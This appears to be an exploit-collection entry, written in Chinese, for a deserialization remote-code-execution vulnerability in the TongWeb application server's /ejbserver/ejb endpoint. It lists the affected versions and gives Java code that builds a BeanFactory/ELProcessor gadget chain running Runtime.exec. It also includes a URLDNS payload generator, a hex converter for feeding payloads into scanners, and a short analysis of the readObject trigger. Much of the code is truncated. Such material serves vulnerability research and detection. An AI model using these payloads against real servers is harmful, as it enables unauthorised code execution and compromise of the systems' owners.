# 东方通TongWebejbserver反序列化漏洞

- **系统**：东方通TongWebejbserver　|　**类型**：反序列化　|　**CVE**：—
- **请求**：`POST /ejbserver/ejb HTTP/1.1`

**请求体 / payload**
```
import com.tongweb.naming.ResourceRef;
import com.tongweb.xbean.naming.context.WritableContext;
import sun.reflect.ReflectionFactory;
import javax.naming.RefAddr;
import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Vector;
public class GenerateRCE {
public static void setField(Object obj, String fieldName, Object value) {
Class clazz = obj.getClass();
while (true) {
Field field = null;
try {
field = clazz.getDeclaredField(fieldName);
field.setAccessible(true);
field.set(obj, value);
break;
} catch (Exception e) {
clazz = clazz.getSuperclass();
public static void main(String[] args) throws Exception {
System.out.println("开始生成 RCE Payload...");
System.setProperty("com.tongweb.commons.collections.enableUnsafeSerialization", "true");
ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
Vector<RefAddr> evilVector = new Vector<>();
evilVector.add(new StringRefAddr("forceString", "x=eval"));
evilVector.add(new StringRefAddr("x", "Runtime.getRuntime().exec('calc.exe')"));
setField(resourceRef, "className", "javax.el.ELProcessor");
setField(resourceRef, "classFactory", "com.tongweb.naming.factory.BeanFactory");
setField(resourceRef, "addrs", evilVector);
Constructor<?> con…（脚本共 7649 字，完整版见原文）
```

**其他**
- 版本: 7.0.0.0<=TongWeb<=7.0.4.9\_M9
6.1.7.0<=TongWeb<=6.1.8.13
- 漏洞简单分析: <code>\TongWeb7.0\lib\tongweb.jar!\com\tongweb\tongejb\server\ejbd\EjbDaemon.class</code>
漏洞触发点
跟进去看看代码，这里使用了 readObject 函数，对进入的数据进行了反序列化操作
<code>\TongWeb7.0\lib\tongweb.jar!\com\tongweb\tongejb\client\ProtocolMetaData.class</code>
定义了反序列的数据格式，要触发反序列，还需要符合它的格式才行
需要满足这个正则 <code>spec.matches("^OEJP/[0-9]\.[0-9]$")</code>
只有符合格式的反序列化数据才能正常进入到 <code>serverMetaData.readExternal(ois);</code> 才会触发<code>r
- TongWeb 调试开启: 如果需要调试代码，只要的启动文件后面跟上下面命令就行
```plain
startserver.bat debug 5008
```
- dnslog: 生成反序列化数据包，其中用到 TongWeb 的依赖 <code>xbean-naming-4.5.jar,tongweb.jar</code>
```plain
import com.tongweb.tongejb.client.ServerMetaData;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URI;
import java.net.URL;
import java.util.HashMap;
public class GenerateURLDNS {
    public static void main(Stri
- 将反序列化数据转化 hex: 将反序列化数据转化 hex，主要是很好集成到其他工具中，例如 afrog，nuclei 等工具中
```plain
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
public class FileToHexModern {
    public static void main(String[] args) {
        String filePath = "./output.ser";
        try {
            byte[] fileBytes = Files.readAllBytes(Paths.get(filePath));
            String hexString = bytesToHex(fileBytes);